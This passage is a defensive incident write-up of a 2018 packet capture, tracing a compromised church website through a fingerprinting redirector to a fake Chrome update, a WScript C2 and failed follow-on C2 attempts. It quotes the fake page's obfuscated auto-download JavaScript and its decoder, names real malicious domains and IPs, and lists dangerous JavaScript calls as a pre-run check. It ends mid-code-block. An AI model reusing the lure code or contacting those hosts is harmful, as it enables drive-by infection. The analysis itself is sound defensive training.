---
title: Sorting through the alerts — hacked church site to a fake Chrome update, a WScript C2, a 349 KB payload and failed follow-on C2 (Splunk first, Arkime second)
tags:
  - blue-team
  - pcap
  - splunk
  - zeek
  - arkime
  - cyberchef
  - snort
  - socgholish
  - fake-update
  - c2
  - ticket
---

# Sorting through the alerts — fake Chrome update to WScript C2 and follow-on C2 attempts { #sorting-alerts }

!!! abstract "Case summary"
    malware-traffic-analysis.net **2018-06-30 "Sorting through the alerts"**, worked step by step on the home-lab **pcapbox** VM with **Splunk (Zeek logs) as the main tool** and **Arkime only where Splunk cannot see** (page and POST contents). One Windows 7 PC (**CONSERVATOR-PC, user lloyd.maxwell**) opens a **hacked church website**. Script hidden in the site sends the browser through a **fingerprinting redirector (TDS)** to a **fake "Update Chrome" page**, which downloads **`Chrome_72.3.22.js` from Dropbox**. 46 seconds later the user runs it: `wscript.exe` sends **three XOR-encoded POSTs** (host, user, domain, process list) to a C2 and gets back a **349 KB encoded payload**, reported as `Chrome_72.3.22.exe` in `%TEMP%`. Ten seconds later the PC starts trying two **hard-coded C2 IPs** every ~7.5 minutes — **one refuses, one never answers**. Ends with one simple Snort rule and a short ticket.

| | |
|---|---|
| **Evidence** | `2018-06-30-traffic-analysis-exercise.pcap` — 2018-06-30 20:27:15 – 20:59:06 UTC (31.9 min) |
| **Source** | [malware-traffic-analysis.net 2018-06-30 "Sorting through the alerts"](https://malware-traffic-analysis.net/2018/06/30/index.html) |
| **Given** | LAN 172.16.2.0/24, DC 172.16.2.9, domain fabulousdukes.com |
| **Environment** | Closed network. pcapbox VM: Splunk (`index=zeek`, case field `pcap_case`), Arkime (tag = case name), Snort 2.9.20, CyberChef. **No Wireshark.** |
| **Case name** | `20180630_SORTING_THROUGH_THE_ALERTS` |
| **Deliverables** | Analysis, decoded download URL and C2 bodies, one Snort rule, one incident ticket (txt) |
| **Related pages** | [Night Dew, second pass (pcapbox, Snort test guide)](night-dew-arkime-splunk-netlogon-bruteforce.md) · [BEGUILESOFT (Splunk-first baselining)](beguilesoft-hawkeye-ftp-exfil.md) · [SPL cheat sheet](../splunk/spl-cheatsheet.md) · [Arkime search syntax](../../network/arkime/search-syntax.md) · [Zeek logs](../../network/zeek/index.md) |

!!! tip "How to read this page"
    This is the case as it was actually worked: every result block is what the analyst's Splunk or Arkime showed. Each step goes **Goal → Splunk → Arkime (only when Splunk cannot show it) → Result → Reading the result → Ticket entry**. Every SPL query is explained line by line. **Question** boxes are questions asked during the work, with their answers.

    Statements are marked where it matters: **[data]** = seen in Splunk or Arkime, **[inference]** = a conclusion drawn from the data and still to be proven.

!!! warning "The indicators on this page are real"
    Domains, IPs and hashes come from real 2018 malware traffic. Prose and tables are defanged (`hxxp`, `[.]`); code blocks keep values as typed. **Do not visit them.** Do not run anything you extract.

## Answers at a glance { #answers }

| Item | Answer | Status |
|---|---|---|
| Infected PC | **172.16.2.169, CONSERVATOR-PC**, Windows 7 x64 | Confirmed (Kerberos, NTLM, DNS) |
| User | **lloyd.maxwell** (domain FABULOUSDUKES) | Confirmed |
| DC | 172.16.2.9, FABULOUSDUKE-DC | Confirmed |
| First malicious event | **20:27:53 UTC** — visit to the hacked site `www.stmarybahrain[.]com` (66.226.144.232), no Referer | Confirmed |
| Redirect chain | Site script → `track.positiverefreshment[.]org/s_code.js` (185.244.149.74, browser fingerprint) → fake page `lw2e.sineadhollywoodnutt[.]com/topics/index.php` (93.95.100.178) | Confirmed |
| Download | `hxxps://www.dropbox[.]com/s/fvl9rd86cmdilns/Chrome_72.3.22.js?dl=1` at 20:28:00–01, ~23 KB received | URL decoded; download proven by SNI and timing; content not visible (HTTPS) |
| Execution | 20:28:47 — `wscript.exe` POSTs to `bb17eb22.login3.kimbrelelectric[.]com/blank.gif` (93.95.100.138) | Confirmed (body `b=` shows the script path and `wscript.exe`) |
| Data sent | Script path, host, user, domain, AV name, screen, process list | Confirmed (decoded) |
| Payload | 349 KB hex reply → reported as `C:\Users\LLOYD~1.MAX\AppData\Local\Temp\Chrome_72.3.22.exe` | Path confirmed; execution inferred from what follows |
| Follow-on C2 | 46.105.131.66:443 (refused) and 107.170.231.118:4143 (no answer), every ~7.5 min until the end | Confirmed — **no C2 session ever worked** |
| Family | SocGholish-style fake update; follow-on behaviour consistent with Dridex | Not confirmed (no hash or signature) |

---

## Step 0 — Load the PCAP and check the case { #prep }

**Goal:** give the PCAP a **case name** so its logs do not mix with other exercises, and make sure all tools show **UTC**.

1. Rename the file to **`20180630_SORTING_THROUGH_THE_ALERTS.pcap`** and drop it into `\\10.50.10.60\incoming`.
2. On pcapbox, wait for `DONE case=20180630_SORTING_THROUGH_THE_ALERTS` in `tail -f /data/logs/ingest.log`.
3. Splunk **Preferences → Time zone = UTC**; Arkime **Settings → Timezone = UTC**, time range **All**.

```spl
index=zeek sourcetype=zeek:conn
| stats count by pcap_case
```

- `index=zeek` — the index (Splunk's "drawer") that holds Zeek logs.
- `sourcetype=zeek:conn` — the connection log, one line per connection.
- `|` — pass the results on to the next command.
- `stats count by pcap_case` — count lines per case name.

!!! note "`ts`, not `_time`"
    Zeek's own event time is **`ts`** (epoch seconds). Every query on this page sorts and prints with `ts` so it also works on a Splunk where `_time` is the ingest time. `eval t=strftime(ts,"%H:%M:%S")` turns it into a readable time.

!!! tip "Long case names"
    `pcap_case=20180630_SORTING*` works in Splunk (`*` = anything) as long as it matches no other case. Arkime's `tags ==` needs the full name.

---

## Step 1 — Baselining { #baseline }

Baselining = learning what is **normal** in this capture before looking for anything bad: time range, log types, internal PCs, how busy they are, and who they are.

### 1-1. Which logs exist { #log-types }

```spl
index=zeek pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| stats count by sourcetype
| sort - count
```

- No `sourcetype` → all log types of this case. `sort - count` = largest first (`-` descending).

```text
sourcetype          count
zeek:conn           729
zeek:dns            313
zeek:ssl            265
zeek:files          176
zeek:x509           171
zeek:http           134
zeek:ocsp           72
zeek:kerberos       37
zeek:ldap_search    21
zeek:dce_rpc        18
zeek:ldap           13
zeek:weird          7
zeek:smb_mapping    6
zeek:software       5
zeek:ntp            4
zeek:smb_files      2
zeek:ntlm           1
```

**[data] Reading:**

- **`zeek:dhcp` is missing.** The PC already had its IP lease when the capture started, so the host name must come from somewhere else (1-5).
- **Web logs dominate** (`ssl` 265, `http` 134): someone was browsing. HTTPS is twice HTTP, but the **134 HTTP requests can be read in full** — they will be the main material.
- **Domain logs** (`kerberos`, `ldap`, `dce_rpc`, `smb_*`, `ntlm`) = an AD PC talking to its DC: logons, group policy. User and computer names live here.
- `ocsp` (certificate checks), `ntp` (time), `weird` (odd packets) are normally harmless. `software` lists programs Zeek recognised — useful in 1-5.

### 1-2. Capture window { #window }

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| stats min(ts) as first max(ts) as last count as sessions
| eval duration_min=round((last-first)/60,1)
| eval first=strftime(first,"%Y-%m-%d %H:%M:%S"), last=strftime(last,"%Y-%m-%d %H:%M:%S")
```

- Line 2: one summary row — earliest, latest, number of connections. `as` names the result.
- Line 3: `eval` computes a new field; minutes, one decimal.
- Line 4: epoch → readable date. **Line 3 must come before line 4** — after line 4 `first` and `last` are text and cannot be subtracted.

```text
first                 last                  sessions  duration_min
2018-06-30 20:27:15   2018-06-30 20:59:06   729       31.9
```

### 1-3. Which internal IPs start connections { #internal-hosts }

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| stats count as sessions dc(id_resp_h) as destinations sum(orig_bytes) as sent sum(resp_bytes) as received min(ts) as first max(ts) as last by id_orig_h
| eval first=strftime(first,"%H:%M:%S"), last=strftime(last,"%H:%M:%S")
| sort - sessions
```

- `id_orig_h` = the IP that **started** the connection (`orig` = originator, `resp` = responder, `_h` = host, `_p` = port).
- `dc()` = distinct count. `orig_bytes` / `resp_bytes` = payload bytes sent by each side.

```text
id_orig_h      sessions  destinations  sent     received   first     last
172.16.2.169   729       184           845926   34269192   20:27:15  20:59:06
```

**[data] Reading:**

- **One PC.** The DC does not appear: Zeek files its NetBIOS reply under the connection the PC started (for UDP too, the side that sends first is `orig`).
- **184 destinations in 32 minutes** — a beacon needs 1–3. This is a **person browsing** (one news page pulls dozens of ad and CDN servers), so "top talker" will not find the malware. The plan is to **remove the normal and see what is left**.
- Received ≫ sent (34 MB vs 0.85 MB) — normal for a PC. The reverse would suggest exfiltration.

### 1-4. Arkime cross-check { #arkime-baseline }

```text
tags == 20180630_SORTING_THROUGH_THE_ALERTS
```

**654 sessions** (Zeek 729 — the tools split UDP and retried connections differently; the picture is the same). **SPIView → General → Src IP / Dst IP** shows one PC and a long list of destinations.

**How to read Databytes / Bytes:** the top number is **data** (payload), the bottom is total bytes with headers. **Databytes 0** = only connection signals, no data.

**[data] Lines that look different — noted, not concluded:**

| Destination | Shape |
|---|---|
| `46.105.131.66:443` | Several sessions per source port, 2 packets each, **Databytes 0**, repeating every few minutes |
| `107.170.231.118:4143` | 3 packets, **Databytes 0**, unusual port, repeating every few minutes |

Everything else is ordinary DC traffic (53 DNS, 88 Kerberos, 123 NTP, 389 LDAP, 445 SMB, 137/138 NetBIOS, 5355 LLMNR `wpad`, 1900 SSDP) and `crl.microsoft.com`.

### 1-5. Who is 172.16.2.169 { #identity }

No DHCP, so use the other places Windows says its name.

**① Kerberos**

```spl
index=zeek sourcetype=zeek:kerberos pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first count values(request_type) as types values(success) as success values(error_msg) as errors by client
| sort first
```

- `client` = `account/REALM`. `values()` = every distinct value. `request_type`: **AS** = logon ticket (TGT), **TGS** = service ticket, **AP** = presenting a ticket to a service.

```text
client                              first     count  types    success      errors
/FABULOUSDUKES.COM                  20:27:17  13     AP       true
CONSERVATOR-PC$/FABULOUSDUKES.COM   20:27:17  11     AS TGS   false true   KDC_ERR_PREAUTH_REQUIRED
conservator-pc$/FABULOUSDUKES.COM   20:27:17  2      AS       false true   KDC_ERR_PREAUTH_REQUIRED
lloyd.maxwell/FABULOUSDUKES         20:27:18  2      AS       false true   KDC_ERR_PREAUTH_REQUIRED
lloyd.maxwell/FABULOUSDUKES.COM     20:27:18  5      TGS      true
conservator-pc$/fabulousdukes.com   20:27:44  2      AS       false true   KDC_ERR_PREAUTH_REQUIRED
```

| Seen | Meaning |
|---|---|
| Name ends in `$` | **Computer account** → host name **CONSERVATOR-PC** |
| No `$` | **User** → **lloyd.maxwell**, logged on at 20:27:18 |
| Empty account (`/FABULOUSDUKES.COM`, AP) | The name is inside the encrypted part of an AP request; Zeek cannot show it. Normal |
| Same account in different case/realm | Windows is not consistent; same account |
| `KDC_ERR_PREAUTH_REQUIRED` then success | Normal pre-authentication. A wrong password would be `KDC_ERR_PREAUTH_FAILED` — none here |

**② NTLM**

```spl
index=zeek sourcetype=zeek:ntlm pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| eval t=strftime(ts,"%H:%M:%S")
| table t id_orig_h id_resp_h id_resp_p username hostname domainname server_nb_computer_name success
```

```text
t         id_orig_h     id_resp_h   id_resp_p  username          hostname         domainname     server_nb_computer_name  success
20:27:35  172.16.2.169  172.16.2.9  445        CONSERVATOR-PC$   CONSERVATOR-PC   FABULOUSDUKES  FABULOUSDUKE-DC          true
```

The computer account logging on to the DC's SMB share at start-up (group policy). It also names the DC: **FABULOUSDUKE-DC**.

**③ DNS dynamic update**

```spl
index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS qtype_name=SOA
| eval t=strftime(ts,"%H:%M:%S")
| table t id_orig_h id_resp_h query qtype_name rcode_name
```

```text
t         id_orig_h     id_resp_h   query                              qtype_name  rcode_name
20:37:03  172.16.2.169  172.16.2.9  conservator-pc.fabulousdukes.com   SOA         NOERROR
20:27:16  172.16.2.169  172.16.2.9  conservator-pc.fabulousdukes.com   SOA         NOERROR
```

A domain PC registers its own name with the DC; the `SOA` query comes first. Exactly 10 minutes apart — Windows re-registering. Three sources agree: **CONSERVATOR-PC / fabulousdukes.com**.

**④ Software**

```spl
index=zeek sourcetype=zeek:software pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| eval t=strftime(ts,"%H:%M:%S")
| table t host software_type name unparsed_version
```

```text
t         host          software_type   name                  unparsed_version
20:43:13  172.16.2.169  OS::WINDOWS     Windows
20:33:54  172.16.2.169  HTTP::BROWSER   Microsoft BITS        Microsoft BITS/7.5
20:28:47  172.16.2.169  HTTP::BROWSER   MSIE                  Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; ...)
20:28:00  172.16.2.169  HTTP::BROWSER   Microsoft-CryptoAPI   Microsoft-CryptoAPI/6.1
20:27:53  172.16.2.169  HTTP::BROWSER   Chrome                Mozilla/5.0 (Windows NT 6.1; Win64; x64) ... Chrome/67.0.3396.99 Safari/537.36
```

- Zeek writes each program it recognises once. `Windows NT 6.1` = Windows 7, `Win64; x64` = 64-bit.
- The user's browser is **Chrome 67** (20:27:53). BITS (Windows downloads) and CryptoAPI (certificate checks) are Windows itself.
- **[data] 54 s later something calls itself "MSIE 7.0"** — a 2006 browser. With `Trident/7.0` (IE11's engine) on Windows 7 this is the default User-Agent of **Windows' HTTP objects used by scripts** (wscript, Office macros). Noted as a candidate.

**Baseline notes — three candidates, no conclusions yet:**

1. `46.105.131.66:443` — no data, repeating
2. `107.170.231.118:4143` — no data, unusual port, repeating
3. 20:28:47 `MSIE 7.0` — a program that is not the user's browser

**Ticket entry (host line only; baselining itself is not logged):**

```text
172.16.2.169 CONSERVATOR-PC – user FABULOUSDUKES\lloyd.maxwell
```

---

## Step 2 — External destinations: remove the normal, see what is left { #destinations }

### 2-1. By port { #ports }

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_orig_h=172.16.2.169 NOT id_resp_h=172.16.0.0/12 NOT id_resp_h=224.0.0.0/4
| stats count dc(id_resp_h) as ips values(service) as service values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by proto id_resp_p
| sort - count
```

- `NOT id_resp_h=172.16.0.0/12` — Splunk understands CIDR ranges on IP fields; drops internal addresses. `224.0.0.0/4` drops multicast.
- `service` = the protocol Zeek recognised from the content; empty = Zeek could not tell.
- `conn_state`: **SF** normal start and end · **S0** SYN, no answer · **REJ** SYN answered by RST (refused) · **RSTO/RSTR** reset by PC/server · **SH/OTH** partial, common at capture edges.

```text
proto  id_resp_p  count  ips  service  states                          sent    received
tcp    443        364    163  ssl      OTH REJ RSTO RSTR S1 SF         642014  5667734
tcp    80         27     14   http     RSTO SF                         58106   28337141
tcp    4143       16     1             S0                              0       0
udp    443        10     6             SF                              45454   174932
```

**[data] Reading:**

- tcp/443: HTTPS browsing — but a **REJ** is mixed in (2-3 shows who).
- tcp/80: **28 MB** received — 3-1 shows it is BITS from Google.
- **tcp/4143: one IP, no service, only S0, zero bytes.** Unusual port, never answered.
- udp/443 with no service is **QUIC** (Google's HTTPS over UDP, used by Chrome). Zeek's QUIC analyser is off, hence empty. Normal.

### 2-2. By domain { #domains }

```spl
index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_orig_h=172.16.2.169 NOT query="*fabulousdukes.com"
| rex field=query "(?<domain>[^.]+\.[^.]+)$"
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first count dc(query) as names values(query) as examples by domain
| eval examples=mvindex(examples,0,2)
| sort first
```

- `rex` cuts part of a value into a new field with a regular expression. `(?<domain> … )` names the part; `[^.]+` = characters that are not a dot; `\.` = a real dot; `$` = end. Result: the last two labels (`r4---sn-p5qs7nek.gvt1.com` → `gvt1.com`).
- `mvindex(list,0,2)` keeps the first three values (counted from 0).

116 domains came back. **How to remove the normal:**

1. Known companies: microsoft, google, googleapis, bing, facebook, twitter, yahoo, cloudfront, windows.net.
2. **The CNN burst:** `cnn.com` at 20:27:52, then dozens of ad and tracking domains 20:27:53–20:28:03 (optimizely, doubleclick, outbrain, rubiconproject, pubmatic, criteo …). Names with *ad, pixel, sync, match, track, cdn, beacon* are mostly ad tech.
3. Windows itself: `gvt1.com` (BITS), `digicert.com`, `_tcp.local` (Chromecast discovery).

**[data] What is left, in time order:**

| First | Domain | Note |
|---|---|---|
| 20:27:52 | **stmarybahrain.com** (`www.`) | A church site, same second as CNN |
| 20:27:54 | **positiverefreshment.org** (`track.`) | "track" on a non-ad domain |
| 20:27:56 | **sineadhollywoodnutt.com** (`lw2e.`) | Person-like name, random-looking sub-domain |
| 20:27:59 | dropbox.com | Legitimate, but a **file download** service |
| 20:28:00 | dropboxusercontent.com (`uc7cfbc6f….dl.`) | Dropbox's file server |
| 20:28:24 | summerhamster.com | Odd name — see the question box |
| 20:28:46 | **kimbrelelectric.com** (`bb17eb22.login3.`) | Electrical company name with a generated-looking sub-domain |

!!! question "Question: why is summerhamster.com not kept?"
    Its DNS answer is a **CNAME** (alias) to `bc.sp-prod.net`, an ad platform, and Chrome made one HTTPS connection to it. Same shape as the other ad domains. **Following the CNAME** is another way to remove the normal:

    ```spl
    index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS query="www.summerhamster.com"
    | table ts query answers
    ```

### 2-3. Destinations reached with no DNS lookup { #no-dns }

People browse by name. A connection to an IP that was **never looked up** may be an address built into a program.

```spl
index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_orig_h=172.16.2.169 NOT id_resp_h=172.16.0.0/12 NOT id_resp_h=224.0.0.0/4
    NOT [search index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS | mvexpand answers | rename answers as id_resp_h | dedup id_resp_h | fields id_resp_h]
| eval t=strftime(ts,"%H:%M:%S")
| stats min(t) as first max(t) as last count values(id_resp_p) as ports values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by id_resp_h
| sort first
```

- The `[ … ]` **subsearch** runs first: every IP in DNS answers (`mvexpand` splits a multi-value field into one row per value; `rename` matches the conn field name). It returns `(id_resp_h="a" OR id_resp_h="b" …)`; `NOT` keeps only IPs **never** seen in a DNS answer.
- Caveat: IPs looked up **before** the capture also appear here. Watch for those near the capture start.

```text
id_resp_h         first     last      count  ports  states  sent  received
46.105.131.66     20:29:00  20:59:06  30     443    REJ     0     0
107.170.231.118   20:31:14  20:53:51  16     4143   S0      0     0
```

**[data] Reading:** only **two** of 184 destinations — exactly baseline candidates 1 and 2. The REJ in 2-1's tcp/443 row is 46.105.131.66: port 443 but not HTTPS, refused every time. First seen almost 2 minutes after the capture starts, then repeated for 30 minutes — **a program, not a person**. And 20:29:00 is only **13 seconds** after candidate 3 (`MSIE 7.0`, 20:28:47).

**Clues so far, in time order:** church site (20:27:52) → `track.` (20:27:54) → `lw2e.` (20:27:56) → Dropbox file server (20:28:00) → `kimbrelelectric` (20:28:46) → `MSIE 7.0` (20:28:47) → no-DNS IP attempts (20:29:00). **[inference]** A site visit led to a download, something non-browser then talked to kimbrelelectric, then hard-coded IPs. Step 3 checks this with HTTP.

**Ticket entry:**

```text
[1951 261124, Sung] – Looking for external connections by 172.16.2.169 without a DNS lookup – Found – Further Analysis Required
```

---

## Step 3 — HTTP: from a church website to a fake Chrome update { #http }

### 3-1. HTTP by host { #http-hosts }

```spl
index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_THROUGH_THE_ALERTS
| eval host=mvdedup(host)
| eval t=strftime(ts,"%H:%M:%S")
| stats count min(t) as first values(method) as methods values(user_agent) as user_agents sum(response_body_len) as received by host
| sort first
```

- `host` = the HTTP Host header. `method`: GET fetch, POST send, HEAD headers only.
- `mvdedup(host)` — explained in the box below.

!!! question "Question: the counts came out doubled — why, and is there a permanent fix?"
    The first run summed to 268 while 134 events were found. In the results `host` had **two identical values**: `["www.stmarybahrain.com","www.stmarybahrain.com"]`.

    pcapbox copies the Zeek JSON key `"host"` into Splunk's built-in `host` field at index time (so `host="…"` searches are fast). At search time `KV_MODE = json` extracts the same key again and **appends** it to the existing `host` field. Zeek's key name collides with Splunk's reserved field name. `stats … by host` counts once per value → every event twice. `zeek:software` (key `host` = IP) had the same issue.

    - **In a query:** `| eval host=mvdedup(host)` removes duplicate values.
    - **Permanent fix (pcapbox):** add a calculated field to the search-time stanza `[source::/data/zeek/...]` in `/opt/splunk/etc/apps/pcapbox/local/props.conf`, then restart Splunk:

        ```text
        EVAL-host = mvdedup(host)
        ```

        Calculated fields run after JSON extraction, so the duplicate is removed on every search, for data already indexed — no re-ingest. Check: `… | eval n=mvcount(host) | stats count by n` should give only `n=1`.
    - Keep the `mvdedup` habit on team Splunks whose config you cannot change; it does no harm where there is no duplicate.

```text
host                                   count  first     methods    user_agents                              received
www.stmarybahrain.com                  52     20:27:53  GET        Mozilla/5.0 ... Chrome/67.0.3396.99 ...  1220096
track.positiverefreshment.org          3      20:27:55  GET        Mozilla/5.0 ... Chrome/67.0.3396.99 ...  10001
lw2e.sineadhollywoodnutt.com           9      20:27:57  GET        Mozilla/5.0 ... Chrome/67.0.3396.99 ...  321733
ocsp.digicert.com                      1      20:28:00  GET        Microsoft-CryptoAPI/6.1                  471
bb17eb22.login3.kimbrelelectric.com    3      20:28:47  POST       Mozilla/4.0 (compatible; MSIE 7.0; ...)  360734
r4---sn-p5qs7nek.gvt1.com              15     20:33:54  GET HEAD   Microsoft BITS/7.5                       13046157
redirector.gvt1.com                    32     20:33:54  GET HEAD   Microsoft BITS/7.5                       11101
... (6 more gvt1.com hosts, BITS)
crl.microsoft.com                      2      20:43:13  GET        Microsoft-CryptoAPI/6.1                  1012
```

**[data] Reading:**

- The 28 MB on tcp/80 is **BITS from Google's download servers (`gvt1.com`)** from 20:33:54 — a Windows background download. Normal.
- Programs match 1-5: Chrome → church site, `track.`, `lw2e.`; CryptoAPI → certificate servers; BITS → Google.
- **`MSIE 7.0` → only kimbrelelectric.com, only POST, three times**, ~360 KB received. Browsing is mostly GET. A non-browser program **sent data and got a lot back**.

### 3-2. Who sent the browser where — the Referer chain { #referer }

The **Referer** header says "I came from this page". Following it shows which page called which. (HTTP spells it *Referer*; Zeek names the field `referrer`.)

```spl
index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_THROUGH_THE_ALERTS host IN ("www.stmarybahrain.com","track.positiverefreshment.org","lw2e.sineadhollywoodnutt.com")
| eval t=strftime(ts,"%H:%M:%S.%3N")
| search NOT uri="*.jpg*" NOT uri="*.png*" NOT uri="*.gif*" NOT uri="*.css*"
| sort ts
| table t host uri referrer status_code resp_mime_types response_body_len
```

- `host IN ("a","b")` = `host="a" OR host="b"`. `%3N` = milliseconds. The `search NOT …` line hides images and style sheets.
- `status_code`: 200 OK, 301/302 moved, 404 not found. `resp_mime_types` = Zeek's guess from the **content**.

```text
t              host                            uri                                                         referrer                             status  mime                     len
20:27:53.623   www.stmarybahrain.com           /                                                           -                                    200     text/html                155
20:27:53.765   www.stmarybahrain.com           /new                                                        http://www.stmarybahrain.com/        301     text/html                241
20:27:53.892   www.stmarybahrain.com           /new/                                                       http://www.stmarybahrain.com/        200     text/html                31295
20:27:54.629   www.stmarybahrain.com           /new/media/system/js/mootools.js                            http://www.stmarybahrain.com/new/    200     text/plain               75192
...            (caption.js, ext-core.js, menu.min.js, md_stylechanger.js, jquery.js [application/javascript], s3Slider.js)
20:27:55.731   track.positiverefreshment.org   /s_code.js?cid=220&v=24eca7c911f5e102e2ba                   http://www.stmarybahrain.com/new/    200     application/javascript   2761
20:27:56.081   track.positiverefreshment.org   /s_code.js?cid=220&v=77e997b1…&rand=…&key=…&0=0&1=&2=16       http://www.stmarybahrain.com/new/    200     application/javascript   4911
20:27:56.468   track.positiverefreshment.org   /s_code.js?cid=220&v=5f210213…&0=Mozilla&1=Netscape&2=5.0 (Windows NT 6.1; …)…   http://www.stmarybahrain.com/new/   200   application/javascript   2329
20:27:57.029   lw2e.sineadhollywoodnutt.com    /topics/index.php?s=775118&b=220&a=88a209071dc04d3568f791712c740240   http://www.stmarybahrain.com/new/   200   application/javascript   4399
20:27:58.485   lw2e.sineadhollywoodnutt.com    /chromefiles/k3k702ZOKiLJc3WVjuplzOgdm0LZdjqr5-oayXSOefg.woff2   http://lw2e.sineadhollywoodnutt.com/chromefiles/css.css   200   application/font-woff2   16276
```

**[data] Reading:**

1. **20:27:53 — the user opened the church site.** `GET /` has **no Referer**: typed or bookmarked, no phishing link in front. `/` → `/new` (301) → `/new/` (the page), then the site's own seven scripts.
2. **20:27:55–56 — the church page called a stranger.** `track.positiverefreshment.org` has **Referer `…stmarybahrain.com/new/`**: something inside the church page called it. **[inference]** The site is **compromised**.
3. **`s_code.js` three times, each URL longer.** The third carries a **browser fingerprint**: browser, full User-Agent, `Win32`, screen `1920x1080`, `en-US`, plugins, the **GPU (`NVIDIA GeForce GT 730`)** and colour settings. This is a **TDS** (traffic distribution system) deciding whether to infect: real Windows PC → pass; VM, sandbox, researcher, phone → filter out.
4. **20:27:57 — passed.** `lw2e.sineadhollywoodnutt.com/topics/index.php` — again with the church page as Referer. `cid=220` (TDS) and `b=220` (this server): **same number, same campaign**. The reply is JavaScript, not HTML.
5. **20:27:58 — the disguise.** Fonts and `css.css` from a folder called **`/chromefiles/`**, on a domain that is not Google.

**IP check:**

```spl
index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_THROUGH_THE_ALERTS host IN ("www.stmarybahrain.com","track.positiverefreshment.org","lw2e.sineadhollywoodnutt.com","bb17eb22.login3.kimbrelelectric.com")
| stats values(id_resp_h) as server_ip by host
```

```text
host                                  server_ip
bb17eb22.login3.kimbrelelectric.com   93.95.100.138
lw2e.sineadhollywoodnutt.com          93.95.100.178
track.positiverefreshment.org         185.244.149.74
www.stmarybahrain.com                 66.226.144.232
```

**93.95.100.178** (fake page) and **93.95.100.138** (kimbrelelectric) share `93.95.100` — the **same /24**. Unrelated names, same server block: **[inference]** same operator.

**Ticket entry:**

```text
[2005 261124, Sung] – Investigating HTTP referer chain from www.stmarybahrain.com to track.positiverefreshment.org and lw2e.sineadhollywoodnutt.com – Found – Further Analysis Required
```

### 3-3. The fake page's content (Arkime) { #fake-page }

Zeek keeps summaries, **not bodies**. What the page told the browser to do is in the body.

```text
tags == 20180630_SORTING_THROUGH_THE_ALERTS && host.http == lw2e.sineadhollywoodnutt.com && http.uri == *index.php*
```

Expand the session (`+`), choose **natural** view and **uncompress**, read the **response**.

```text
<title>Update Chrome</title>
<h1 id="main-title" tabindex="-1">You are using an older version of Chrome</h1>
<a class="button eula-download-button download-button ..." href="javascript:void(0)" id="buttonDownload">Update Chrome</a>

var fileUrl = getUrl('#1)=(l)d(?as8j{.)2}2,.y3v.)2(7;_(e,m;odr)h)C,/fs;n{l7i{dim,c7678,d(r99jl6vif(/0s)/lmyopcg.ex(o2b{p,ogr{dv.{w(w(wp/)/,:;s,p;t{t(h,');
setTimeout(function() { window.location.href = fileUrl; }, 3000);
document.getElementById('buttonDownload').onclick = function() { window.location.href = fileUrl; return false; };
```

**[data] Reading:**

- The script **replaces the church page in place** (`document.head` / `document.body`): the address bar still shows the church site, the screen shows a **Chrome update page**.
- **After 3 seconds** (`setTimeout … 3000`) it opens `fileUrl` by itself; the button does the same.
- Real Chrome never asks a website to update it. **A website offering a browser update is almost always fake.**
- `fileUrl` is hidden. The function that unhides it is in the same reply:

```javascript
function getUrl(url) {
    var res = '';
    for(var i=0; i<url.length; i++) {
        if(i%2===1) res += url[i];
    }
    res = res.split("").reverse().join("");
    return res;
}
```

| Line | Meaning | CyberChef |
|---|---|---|
| `for (… i<url.length …)` | look at every character | — |
| `if(i%2===1) res += url[i]` | `i%2` = remainder of i/2; keep positions 1, 3, 5 … = **the second of every pair** | Find / Replace `(.)(.)` → `$2` |
| `split("").reverse().join("")` | split, reverse, join | Reverse |

### 3-4. Decoding the URL (CyberChef or the browser console) { #decode-url }

**CyberChef recipe**

1. Input: the text **inside** the quotes (129 characters — check `ABC` under Input).
2. **Find / Replace** — Find `(.)(.)` (**REGEX**), Replace `$2`, **Global match** on.
3. **Reverse** — By Character.

`(.)` = any one character, remembered as group 1 / group 2; `$2` = replace the pair with group 2. 129 is odd, so the last character has no pair, is left alone, and after Reverse becomes the **first** output character (`,`). Ignore it.

!!! question "Question: the output was just the input reversed / full of symbols"
    Two mistakes made on the way, both common:

    - **Find and Replace were swapped** (`$2` in Find, Replace empty). In a regex `$` means "end of line", so `$2` matches nothing and only Reverse runs.
    - **The quotes were left in the input** (`ABC` showed 131). One extra leading `'` shifts every pair by one, so the recipe picks positions 0, 2, 4 … — exactly the junk characters. In JavaScript the quotes only mark where the text starts and ends; they are not data.

    Habit: when output looks wrong, check the input's **start, end and length** first.

**Shortcut — run only the decode function in a browser console**

1. In an **offline VM** (VMware → Network Adapter → untick *Connected*), open `about:blank`.
2. **F12 → Console.** On first paste, type `allow pasting` by hand.
3. Read the function first. **Do not run it if it contains** `window.location`, `document.write`, `innerHTML`, `eval(`, `Function(`, `fetch(`, `XMLHttpRequest`, `new Image`, `setTimeout`. `getUrl` only loops, splits, reverses and returns — safe. Never copy the `setTimeout` / `onclick` lines: they navigate.
4. Paste the function, Enter → `undefined` (defined, nothing computed yet).
5. Call it **with quotes this time** (in code, quotes mark text):

```javascript
getUrl('#1)=(l)d(?as8j{.)2}2,.y3v.)2(7;_(e,m;odr)h)C,/fs;n{l7i{dim,c7678,d(r99jl6vif(/0s)/lmyopcg.ex(o2b{p,ogr{dv.{w(w(wp/)/,:;s,p;t{t(h,')
```

```text
